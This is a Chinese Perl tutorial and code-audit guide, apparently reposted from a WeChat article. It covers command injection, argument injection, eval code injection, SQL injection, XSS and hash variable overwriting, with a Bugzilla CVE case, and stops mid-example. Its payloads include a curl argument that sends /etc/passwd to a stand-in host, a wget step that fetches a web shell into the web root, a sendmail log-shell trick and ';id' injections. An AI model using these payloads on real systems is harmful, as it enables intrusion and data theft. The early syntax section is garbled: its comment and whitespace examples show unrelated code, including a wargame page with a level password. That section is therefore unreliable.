\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/sdNZxt0eXEKk0EMMpdgzRg)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcN3yHznn9eZ1A3E2NsFJUU1GW8ZjsJ3icqpE8ZVkMWictKoxlvLCX1fACg/640?wx_fmt=png)

### 0x01 Perl 基础

Perl 基础部分参考自：

> https://www.runoob.com/perl/perl-tutorial.html

#### 简介

Perl 全称 Practical Extraction and Report Language，一种功能丰富的计算机程序语言，运行在超过 100 种计算机平台上，适用广泛，从大型机到便携设备，从快速原型创建到大规模可扩展开发，其最重要的特性是 Perl 内部集成了正则表达式的功能以及巨大的第三方代码库 CPAN。

Perl 语言的应用范围很广，除 CGI 以外，Perl 被用于图形编程、系统管理、网络编程、金融、生物以及其他领域。由于其灵活性，Perl 被称为脚本语言中的瑞士军刀。

Perl 是一种弱类型语言。

#### 运行方式

1、交互式：`perl -e <perl code>`

2、运行脚本（以 .pl、.PL 作为后缀）：`perl script.pl`

#### 数据类型

Perl 是一种弱类型语言，所以变量不需要指定类型，Perl 解释器会根据上下文自动选择匹配类型。

Perl 有三个基本的数据类型：

**标量**：标量是 Perl 语言中最简单的一种数据类型。这种数据类型的变量可以是数字，字符串，浮点数，不作严格的区分。在使用时在变量的名字前面加上一个`$`，表示是标量。例如：`$a=123;`

**数组**：数组变量以字符`@`开头，索引从 0 开始，如：`@arr=(1,2,3)`

**哈希**：哈希是一个无序的键值对集合。可以使用键作为下标获取值。哈希变量以字符`%`开头。如：`%h=('a'=>1,'b'=>2);`

#### 基本语法

Perl 借用了 C、sed、awk、shell 脚本以及很多其他编程语言的特性，语法与这些语言有些类似，也有自己的特点。

Perl 程序有声明与语句组成，程序自上而下执行，包含了循环，条件控制，每个语句以分号 (;) 结束。

Perl 语言没有严格的格式规范，你可以根据自己喜欢的风格来缩进。

##### 注释符

Perl 注释的方法为在语句的开头用字符`#`，如：

# 这一行是 perl 中的注释

Perl 也支持多行注释，最常用的方法是使用 POD(Plain Old Documentations) 来进行多行注释。方法如下:

```
use strict;
use DBI;
my $host = "localhost";
my $driver = "mysql";
my $database = "test";
# 驱动程序对象的句柄
my $dsn = "DBI:$driver:database=$database:$host";
my $userid = "root";
my $password = "root";
my $username = $ARGV\[0\];
# 连接数据库
my $dbh = DBI->connect($dsn, $userid, $password ) or die $DBI::errstr;
# 预编译SQL语句，注意占位符?的使用
my $sth = $dbh->prepare("SELECT \* FROM users where username = ?");
# 执行SQL语句
$sth->execute($username) or die $DBI::errstr;
# 循环输出所有数据
while ( my @row = $sth->fetchrow\_array() )
{
  print join(':', @row)."\\n";
}
$sth->finish();
$dbh->disconnect();
```

**注意：**

1、=pod、 =cut 只能在行首。

2、以 = 开头，以 =cut 结尾。

3、= 后面要紧接一个字符，=cut 后面可以不用。

##### 空白符解析特点

Perl 解释器不会关心有多少个空白，所有类型的空白如空格、Tab、换行等如果在引号外解释器会忽略它，如果在引号内会原样输出。

```
#!D:/Strawberry/perl/bin/perl.exe
use CGI;
use DBI;
print "Content-type: text/html\\n\\n";
sub sqli\_filter{
    my ( $str, $type ) = @\_;
    defined $str or return "NULL";
    defined $type && ( $type == 6 )
        and return $str;
    $str =~ s/\\\\/\\\\\\\\/sg;
    $str =~ s/\\'/\\\\\\'/sg;
  $str =~ s/\\"/\\\\\\"/sg;
    return $str;
}
$cgi = CGI->new();
my $user = sqli\_filter($cgi->param('user'));
print "User Input After Filter: ".$user."<br><br>";
my $dsn = "DBI:mysql:database=test:localhost";
my $dbh = DBI->connect($dsn, "root", "root") or die $DBI::errstr;
my $sth = $dbh->prepare("SELECT \* FROM users where username = '$user'");
$sth->execute() or die $DBI::errstr;
print "SQL Query Result:<br>";
while ( my @row = $sth->fetchrow\_array() ){
  print join(':', @row)."\\n";
}
$sth->finish();
$dbh->disconnect();
```

输出：

```
#!/usr/bin/perl
use CGI qw(:standard);
print <<END;
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "airooCaiseiyee8he8xongien9euhe8b" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<style>
#content {
    width: 1000px;
}
pre{
    background-color: #000000;
    color: #00FF00;
}
</style>
<h1>natas29</h1>
<div id="content">
END
#
# morla /10111
# '$\_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
#
# credits for the previous level go to whoever
# created insomnihack2016/fridginator, where i stole the idea from.
# that was a fun challenge, Thanks!
#
print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\\\/\\\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>
<form action="index.pl" method="GET">
<select >
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>
END
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($\_);
        }
        print "</pre>";
    }
}
print <<END;
<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
END
```

##### 单双引号解析区别

Perl 双引号和单引号的区别：双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出，但是用单引号定义可以使用多行文本。这点和 PHP 类似（双引号解析变量、而单引号不解析变量）。

```
#!/usr/bin/perl
 
$a = "mi1k7ea";
print "a = $a\\n";
print 'a = $a\\n';
```

输出：

```
a = mi1k7ea
a = $a\\n
```

**Tips：**

（1）双中有双，单中有单都需要`\`转义。

（2）双中有单或单中有双均不需要转义。

（3）单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。

##### Here 文档

Here 文档又称作 heredoc、hereis、here - 字串或 here - 脚本，是一种在命令行 shell（如 sh、csh、ksh、bash、PowerShell 和 zsh）和程序语言（像 Perl、PHP、Python 和 Ruby）里定义一个字串的方法。

```
#!/usr/bin/perl
 
$a = 10;
$var = <<"Mi1k7ea";
这是一个 Here 文档实例，使用双引号。
可以在这输如字符串和变量。
例如：a = $a
Mi1k7ea
print "$var\\n";
 
$var = <<'Mi1k7ea';
这是一个 Here 文档实例，使用单引号。
例如：a = $a
Mi1k7ea
print "$var\\n";
```

输出：

```
这是一个 Here 文档实例，使用双引号。
可以在这输如字符串和变量。
例如：a = 10
这是一个 Here 文档实例，使用单引号。
例如：a = $a
```

**注意**：

1、必须后接分号，否则编译通不过；

2、EOF 可以用任意其它字符代替（例子用的 Mi1k7ea），只需保证结束标识与开始标识一致；

3、结束标识必须顶格独自占一行（即必须从行首开始，前后不能衔接任何空白和字符）；

4、开始标识可以不带引号号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号；

5、当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与 q 和 qq 的用法；

#### 子程序（函数）及传参

Perl 子程序即用户定义的函数。

```
#!/usr/bin/perl
 
# 函数定义
sub Hello{
   print "Hello, World!\\n";
}
 
# 函数调用
Hello();
```

输出：

```
Hello, World!
```

Perl 函数参数使用特殊数组`@_`标明，函数第一个参数为`$_[0]`、第二个参数为`$_[1]`，依次类推。

```
#!/usr/bin/perl
sub Test{
   print '传入的参数：', "@\_\\n";
   return "$\_\[0\].$\_\[1\]";
}
print "返回结果：", Test('mi1k7ea', 'com'), "\\n";
```

输出：

```
传入的参数：mi1k7ea com
返回结果：mi1k7ea.com
```

#### CGI 环境搭建与 CGI 编程

CGI 环境搭建：下载 Apache httpd 服务器，直接运行然后访问`http://localhost/cgi-bin/printEnv.pl`即可：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNZLJE3dpoqlM2S2uGcW3ILR2DmJ0X0pWM5khZV3cB2FCKQfYeM3r5OA/640?wx_fmt=png)

正常没问题的话是如上图所示。注意一点，pl 或 cgi 文件中第一行指定 perl 程序所在路径必须正确，否则会出现 500 Error，我这里本地修改为`#!D:\Strawberry\perl\bin\perl.exe`。

第一个 CGI 程序，test.cgi：

```
#!D:/Strawberry/perl/bin/perl.exe
print "Content-type:text/html\\r\\n\\r\\n";
print '<html>';
print '<head>';
print '<meta charset="utf-8">';
print '<title>mi1k7ea.com</title>';
print '</head>';
print '<body>';
print '<h2>Hello World!</h2>';
print '<p>Mi1k7ea的第一个CGI程序。</p>';
print '</body>';
print '</html>';
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNTeArfJEcvduN7bX47L0JzHpG4y4bMibRAg04gUsxSvlNq1KsgprMdyA/640?wx_fmt=png)

更多具体 CGI 参考，Perl CGI 编程：

> https://www.runoob.com/perl/perl-cgi-programming.html

### 0x02 Perl 代码审计

#### 命令注入

##### system() 函数

system() 函数执行命令是有回显的。system 后可以有圆括号，也可以没有。

###### 参数全部可控

```
$cmd = "echo hacked";
system($cmd)
# 或
# $cmd = $ARGV\[0\];
# system($cmd);
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNMrOqhp6PdkDPkRQQqeY3vpKu41MscZKZsx6D8UN1VJOEGPbp7xg1ZA/640?wx_fmt=png)

###### 参数部分可控

直接拼接命令的场景，可使用命令注入分隔符绕过：

```
$param = $ARGV\[0\];
system("cat /tmp/$param");
# 或
# $param = ";whoami";
# system("cat /tmp/$param");
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNp6MXkxW4vqwX9ZsN6KC0AwhyiaqtI6w8vResAQYOQW9iaVbyOpkQ6ljw/640?wx_fmt=png)

将命令和参数分隔开就不行了，原因在于传递给 system 的参数变成了数组形式、严格按命令和参数进行区分了：

```
$param = ";ls";
system("echo", "helloworld$param");
# 或
# @cmd = ("echo","helloworld;ls");
# system @cmd;
# 或
# $param = $ARGV\[0\];
# system("echo", "helloworld$param");
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcN6UVIPDYEENZ8qVM81iaaxRGV4x9sJfJLPuhgA8iagC8yOIFcXicQm24Cg/640?wx_fmt=png)

###### 参数注入

由前面数组形式执行 system 函数知道，命令注入是不成功的，但是某些写死的命令是可以进行参数注入的。但是这种注入方式较苛刻，需要有两处连续的可控点。

**tar 参数注入**

tar 命令的 –use-compress-program 参数选项可以执行 shell 命令，若存在参数注入则可利用。注入点需要 –use-compress-program 参数及其后面的参数值两处。

```
@cmd = ("tar","--use-compress-program","touch /tmp/perltest/mi1k7ea","-cf","/tmp/perltest/passwd","/etc/passwd");
system @cmd;
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNpPAgoQsF2ej1cZ4sOTbYw3qpJ5Mh1tsnt4XwlWmfZyicPliccdfZsHqw/640?wx_fmt=png)

**find 参数注入**

find 命令的 -exec 参数选项可以执行命令，若存在参数注入则可利用。注入点需要 –execs 参数及其后面的参数值两处。

```
@cmd = ("find","/tmp","-iname","sth","-or","-exec","id",";","-quit");
system @cmd;
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNicVr0EHfFgvpQyW4cGq9uEfQzIiceuaBU2ALYoQWRu4CRHib5ZRbPPsHw/640?wx_fmt=png)

**wget 参数注入**

wget 命令的 –directory-prefix 参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。注入点需要 –directory-prefix 参数及其后面的参数值两处和远程 URL 地址一处。

```
@cmd = ("wget","--directory-prefix","/var/www/html","http://127.0.0.1:8080/shell.php");
system @cmd;
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNaIFW341by7lz751zfV8X9cTyxiceF9AlpxZSSibaEtjiap5Qn1SAR2RIQ/640?wx_fmt=png)

**sendmail 参数注入**

sendmail 涉及到参数注入的几个参数：

1、-O option = value：QueueDirectory = queuedir 选择队列消息

2、-X logfile：这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。

3、-C file：这个参数用 File 变量指定的备用配置文件启动 sendmail 命令。

常见的参数注入方式，这里只列出用法不举例了：

1、向 Web 目录写日志 Shell：`-O QueueDirectory=/tmp -X /var/www/html/log-shell.php`

2、任意文件读取：`-C/etc/passwd -X/tmp/output.txt`

**curl 参数注入**

curl 命令的 -F 参数选项为以 POST 方式提交表单，-T 参数选项为上传文件，这些参数选项都存在参数注入风险。

常见的参数注入方式，这里只列出用法不举例了：

1、以 POST 方式提交任意文件：`-F filename=@/etc/passwd http://a.com/b.php`

2、上传任意文件：`-T /etc/passwd ftp://10.0.0.10`

###### 目录遍历

在参数部分可控且不存在参数注入的场景下，如果注入的参数值为文件路径，那么就可以尝试进行目录遍历攻击。

比如：

```
$param = $ARGV\[0\];
system("cat /tmp/$param");
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNusJPEztvh3ggo1Y2q9BpgdYLqdlfP6VVUI95UgEaCEqmAZBWMgLHlA/640?wx_fmt=png)

##### exec() 函数

exec() 函数和 system() 函数类似，执行命令是有回显的。exec 后可以有圆括号，也可以没有。两者最大的区别是 system() 函数创建了一个 fork 进程，并等待查看命令是成功还是失败（返回一个值）；而 exec() 函数不返回任何内容，它只是执行命令。

###### 参数全部可控

```
$cmd = "echo exec\_inject";
exec $cmd;
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNIhr9YEnsAthvOULcnQR9iaCYRzfuWPicAKBAb4Dljx7R528D3DRbu4LA/640?wx_fmt=png)

###### 参数部分可控

和前面 system 的情况一样，未进行数组分隔时能注入命令执行：

```
$param = ";id";
exec("cat /tmp/$param");
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNKFsEZogyAEXIzn9BicOc9cl7SzoxtBC4h87CToFNg92NmQmfdCy3J5g/640?wx_fmt=png)

同样，数组分隔传参就不行了：

```
$param = ";id";
exec("echo", "helloworld$param");
# 或
# @a = ("echo","helloworld$ARGV\[0\]");
# exec @a;
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNvnPHwuyzEsJGgoKPnpicacsW1XFZfvH4sOOKFrWoKcVapqd1fg2mNVg/640?wx_fmt=png)

此时可尝试如前面 system() 函数中讲到的参数注入或者目录遍历，这里不多说。

##### readpipe() 函数

readpipe() 函数将 EXPR 作为命令执行，然后返回命令执行后的结果。也就是说，单单运行该函数是获取不到命令执行的回显结果的，需要结合 print 才能看到回显。

###### 参数全部可控

```
@result = readpipe("ls -l /tmp");
print "@result";
# 执行命令无回显
readpipe("touch /tmp/perltest/hacked");
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNY69M88A15WicLJqQaDljNbZTtLXE7NXNXlxdtg97unYlDNGYesRo97g/640?wx_fmt=png)

###### 参数部分可控

**readpipe() 函数和前面两个命令执行函数不一样，即使是数组分隔命令和参数传参还是会执行命令！**

```
@param = ("cat","/tmp/;id");
@result = readpipe @param;
print "@result";
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcN4bPuSYCGEVKvASvXTjr5VWKc5KsN17EQBSlbB6238L8VmPTHXcHONw/640?wx_fmt=png)

##### open() 函数

在 Perl 中 open() 函数被用来打开文件。该函数最为常见的使用形式如下：

```
open (FILEHANDLE, "filename");
```

在 Perl 的 open() 函数中，如果在文件名后加上管道符 "|"，则 Perl 将会执行这个文件，而不是打开它。

###### 参数全部可控

open() 函数的 filename 参数可以在其第一个字符前或最后一个字符后注入管道符来实现命令注入：

```
open(STATFILE, "|touch /tmp/perltest/hacked");
open(STATFILE, "touch /tmp/perltest/hacked|");
# 有回显
open(FILE, "|id");
# 无回显
open(FILE, "id|");
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNR69GpAhPPFHSjlchswMJjj3HTd1Eq4CeUgsb2R0R6ULF9a6BnjW2fg/640?wx_fmt=png)

###### 参数部分可控

因为 filename 一般就是某个文件路径，当 filename 参数前面已经指定好路径但实现参数拼接时，我们可以使用目录遍历的方法来实现注入：

```
$param = "../bin/touch /tmp/perltest/hacked|";
open(FILE, "/tmp/$param");
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNOVD7AkKfibbKlybPcJv9taa63FibZaQVQ5Vwju5DJCWE7dk2863wj4gg/640?wx_fmt=png)

但如果是有重定向符写死的就不可以注入了，如果 filename 是含有`>`标志的前缀，那么它是为输出而打开的，并且如果文件已经存在据就会覆盖原文件；如果含有`>>`前缀，那么是为追加打开的；前缀`<`打开文件来进行输入操作，这也是不含前缀的时候的默认方式。比如：

```
$param = "../bin/touch /tmp/perltest/hacked|";
open(FILE, "<", "/tmp/$param");
# 或
$param = "../bin/touch /tmp/perltest/hacked|";
open(FILE, "</tmp/$param");
```

##### 反引号

Perl 的反引号和 PHP 的反引号一样，可用于执行系统命令。具体利用场景需要具体分析。

```
$param = "whoami";
print \`$param\`;
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNiad1fiaM1SrSMpN5emfdGcjtuXiaQeQz43zlEfre5dzjlYHicp1ddqBsMg/640?wx_fmt=png)

#### 代码注入

##### eval

Perl 的 eval 函数的参数就是一段 Perl 代码，与 PHP 以及 JS 的 eval 类似，会执行自己语言的代码。

Perl 的 eval 有两种使用方式，即 eval EXPR 和 eval BLOCK。

###### eval EXPR

EXPR 即表达式。在执行时， Perl 解释器会首先解析表达式的值，然后将表达式值作为一条 Perl 语句插入当前执行上下文。所以，新生成的语句与 eval 语句本身具有相同的上下文环境。这种方式中，每次执行 eval 语句，表达式都会被解析。所以，如果 eval EXPR 如果出现在循环中，表达式可能会被解析多次。eval 的这种方式使得 Perl 脚本程序能实时生成和执行代码，从而实现了 “动态代码”。

使用示例：

```
eval "print 'mi1k7ea'";
eval 'print $a' . ', $b' ;
eval 1 + 3 ;
eval 'print ' . '$a + $b, "\\n"' ;
eval $command;#$command = 'print "mi1k7ea"'
eval $ARGV\[0\];
```

如果 eval 中的 EXPR 即 Perl 代码可控，我们可以直接传入前面说到的命令注入函数实现 RCE。假设 test.pl 如下：

```
eval $ARGV\[0\];
```

此时直接注入`system('touch /tmp/perltest/mi1k7ea')`：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNcs7VpsPABv2lGRdNhibsQjYvR56dtWS6nkBPiaTHFVn1jBVMogSsw1eg/640?wx_fmt=png)

###### eval BLOCK

BLOCK 即代码块。与第一种方式不同， BLOCK 只会被解析一次，然后整个插入当前 eval 函数所在的执行上下文。由于解析上的性能的优势，以及可以在编译时进行代码语法检查，这种方式通常被作为 Perl 用来为一段代码提供异常捕捉机制，虽然前一种方式也可以。

使用示例：

```
eval {print $a};
eval {$a = 1, $b = 2, $c = $a + $b};
```

如果 eval 中的 BLOCK 即 Perl 代码可控，我们可以直接传入前面说到的命令注入函数实现 RCE。假设 test.pl 如下：

```
eval {system("touch /tmp/perltest/mi1k7ea");};
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNEG8QB552seM96qdjicuwicnFU5zJ2LQ7Buy3RrordpAbp1WFC9BnsqCg/640?wx_fmt=png)

另一种 Block 调用：

```
push ( @program,'system("touch /tmp/perltest/mi1k7ea");');
foreach $exp (@program)
{
    $return = eval($exp);
    print $return,"\\n";
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcN3ibK2fjdeA1N8pR4rJmvibXGEuwrEXUH0ofialB2ydricLcbwJdNLNUR9Q/640?wx_fmt=png)

#### SQL 注入

Perl 中操作数据库默认就支持预编译，但是如果使用不当同样是存在 SQL 注入漏洞的。关键在于，没有正确使用占位符`?`。

在 Perl 中可以使用 DBI（Database Independent Interface）模块来连接数据库。DBI 作为 Perl 语言中和数据库进行通讯的标准接口，它定义了一系列的方法、变量和常量，提供一个和具体数据库平台无关的数据库持久层。

DBI 相关函数如下：

1、connect() 函数：用于连接数据库；

2、prepare() 函数：用于预处理 SQL 语句；

3、execute() 函数：用于执行 SQL 语句；

4、finish() 函数：用于释放语句句柄；

5、disconnect() 函数：用于断开数据库连接；

正确使用预编译占位符的例子：

```
use strict;
use DBI;
my $host = "localhost";
my $driver = "mysql";
my $database = "test";
# 驱动程序对象的句柄
my $dsn = "DBI:$driver:database=$database:$host";
my $userid = "root";
my $password = "root";
my $username = $ARGV\[0\];
# 连接数据库
my $dbh = DBI->connect($dsn, $userid, $password ) or die $DBI::errstr;
# 预编译SQL语句，注意占位符?的使用
my $sth = $dbh->prepare("SELECT \* FROM users where username = ?");
# 执行SQL语句
$sth->execute($username) or die $DBI::errstr;
# 循环输出所有数据
while ( my @row = $sth->fetchrow\_array() )
{
  print join(':', @row)."\\n";
}
$sth->finish();
$dbh->disconnect();
```

此时预编译会将占位符的内容定死为参数值而不会将其中的某些字符串解释为 SQL 关键字，也就根源上解决了 SQL 注入问题：  

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNicV0aCvYENLzVbYpLP912JyKqDRicjibicmuTepobUl0iaKFvT3ficIzUTIg/640?wx_fmt=png)

但是，如果没有正确使用预编译占位符，如下代码，在 prepare() 函数中直接拼接变量，就会同样存在 SQL 注入问题：

```
\# 预编译SQL语句，未使用占位符?而是采用变量拼接的方式
my $sth = $dbh->prepare("SELECT \* FROM users where username = '$username'");
# 执行SQL语句
$sth->execute() or die $DBI::errstr;
```

此时就能被 SQL 注入攻击：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNNIMemdI7aaZDa4eBXU6dibiccHmwXUYbsuPFdfibUdAGibSCE54rZav3PQ/640?wx_fmt=png)

**结论：在 prepare() 函数进行预编译操作的时候，需要输入的参数值必须使用占位符，禁止直接使用变量拼接 SQL 语句。**

#### XSS

XSS 是 Web 前端最常见的漏洞，Perl 中也不缺席，关键还是在于 Perl 代码有没有进行 HTML 实体编码或者过滤特殊字符之后再输出到页面上。

比如下面 CGI 直接将参数原样不动返回到界面中：

```
#!D:/Strawberry/perl/bin/perl.exe
use CGI;
print "Content-type: text/html\\n\\n";
$cgi = CGI->new();
print $cgi->param('p');
```

此时，就会产生 XSS 问题：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNQvxibnuDhZuR9ibdgx6jmSMicsNsFUfAKAMmAwyvmluwcDyAbqc1NXNicg/640?wx_fmt=png)

正确防御方法是进行 HTML 实体编码后再输出页面中：

```
print CGI::escapeHTML($cgi->param('p'));
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNFOcSz6UeadoIujFwwicpvUHZ8mqEhEXEG1ia69JibSeribcKM0msYXmckQ/640?wx_fmt=png)

#### 变量覆盖

Perl 语言的一些特性会导致存在一些变量覆盖问题，而变量覆盖往往会导致一些检测机制被绕过或者造成越权漏洞的产生。

##### 哈希引入数组变量覆盖

Perl 的哈希中如果引入了数组，那么数组将会按键对值的结构扁平展开到哈希中，此时存在变量覆盖漏洞。

看个 Demo，在 hash 中引入 list，其中 list 包含 hash 中的一个键 user 并设置了对应的值 admin：

```
@list = ("member", "user", "admin");
%hash = (
    "user" => "mi1k7ea",
    "password" => "666",
    "level" => @list
    );
while (($k, $v) = each %hash) {
    print "$k: $v\\n";
}
```

输出，看到 list 中的键及值直接覆盖了原有的 user 键值对：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNQUMicRfZxX2VDubxRiajrkwdPtEVT5hYib45iaibZxfC4jyTYeicdVVJnelg/640?wx_fmt=png)

延伸到 CGI 场景中同理：

```
#!D:/Strawberry/perl/bin/perl.exe
use CGI;
print "Content-type: text/html\\n\\n";
my $cgi = CGI->new();
%user\_info = ("username" => $cgi->param("username"), "password" => "123");
while (($k, $v) = each %user\_info) {
    print "$k: $v\\n";
}
```

正常请求`/test.cgi?username=guest`时，返回结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNBmwVVGpjHoYib4RuiapphzWdILDW2vfwcANCfjKaCF2n7Qbt5hu95PeQ/640?wx_fmt=png)

但是，当传入 URL 参数的 key 重复多次时`/test.cgi?username=guest&username=username&username=admin`，返回结果：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNSgE0tS2hPcMIMia5h39cdv46fib5AlicADLn77QHlKpbJvVOxpsEnyDkA/640?wx_fmt=png)

看到 username 参数被数组变量覆盖了。原理同上，即当 URL 传入多个同名参数时，`$cgi->param()`函数返回的是一个列表，输入参数`username=test&username=username&username=admin`时返回的是`("test", "username", "admin")`，此时数组就会和哈希结构进行合并，第一个元素 guest 则设置成 username 键的值，剩下的 username 和 admin 则单独组成为一对键值，新生成的键值对会覆盖掉原本的 username 的值为 admin 了。

**案例——CVE-2014-1572（Bugzilla 越权漏洞）**

漏洞代码如下：

```
my $otheruser = Bugzilla::User->create({
    login\_name => $login\_name,
    realname   => $cgi->param('realname'),
    cryptpassword => $password});
```

当提交下面请求内容时：

```
a=confirm\_new\_account&t=\[TOKEN\]&passwd1=\[password\]&passwd2=\[password\]
&realname=test&realname=login\_name&realname=admin@bugzilla.org
```

此时传递给 User->create() 函数的结构如下：

```
{
    realname => 'test',
    login\_name => 'admin@bugzilla.org',
    cryptpassword => $password
}
```

这里漏洞根源正式往`{}`即哈希中传入数组，利用上述的特性导致变量覆盖从而导致越权漏洞的产生。

###### 数组传参变量覆盖

Perl 的函数参数传递中如果传递的参数类型为数组，那么数组将会直接展开来赋值到对应位置的参数上，此时同样存在变量覆盖漏洞。

看个 Demo，test() 函数可传入三个参数，然后分别给其传入不同数量、某个参数类型为数组的参数：

```
sub test {
    ($a, $b, $c) = @\_;
    print "$a$b$c\\n";
}
test(1, 2);
test(1, 2, 3);
test((1, 2, 3));
test(1, (2, 3));
test(1, 2, 3, 4);
test(1, (2, 3), 4);
```

输出：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNlZwW8HUJBqRA2lia4UjfIERkH572ObUIibUD322gvkbRTeqclefFvIDg/640?wx_fmt=png)

可以看到，当传递给子程序的参数即便不够，传递的数组会被展开并赋值给 a、b、c 三个变量上；最后一个调用的第三个传入参数 4 并没有赋值给 c 变量。

这种数组传参覆盖的特性有啥安全问题？看个例子。

```
#!D:/Strawberry/perl/bin/perl.exe
use CGI;
use DBI;
print "Content-type: text/html\\n\\n";
sub sqli\_filter{
    my ( $str, $type ) = @\_;
    defined $str or return "NULL";
    defined $type && ( $type == 6 )
        and return $str;
    $str =~ s/\\\\/\\\\\\\\/sg;
    $str =~ s/\\'/\\\\\\'/sg;
  $str =~ s/\\"/\\\\\\"/sg;
    return $str;
}
$cgi = CGI->new();
my $user = sqli\_filter($cgi->param('user'));
print "User Input After Filter: ".$user."<br><br>";
my $dsn = "DBI:mysql:database=test:localhost";
my $dbh = DBI->connect($dsn, "root", "root") or die $DBI::errstr;
my $sth = $dbh->prepare("SELECT \* FROM users where username = '$user'");
$sth->execute() or die $DBI::errstr;
print "SQL Query Result:<br>";
while ( my @row = $sth->fetchrow\_array() ){
  print join(':', @row)."\\n";
}
$sth->finish();
$dbh->disconnect();
```

这个 CGI 程序会从 Web 端接收一个 user 参数，然后通过自定义的 sqli\_filter() 函数进行 SQL 注入特殊字符转义处理，最后查询数据库中对应的用户信息（假设为正确使用预编译进行 SQL 语句处理）。  

正常访问，输入用户名即可查询用户信息：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNfsicMlPLtnMoIXG3gLz9oOdlm43tm04XoDnxlViabS6vSmtibkwDKzNuQ/640?wx_fmt=png)

尝试进行 SQL 注入获取所有用户信息，注入`?user=testuser' or 1--+`，发现单引号被转义了：

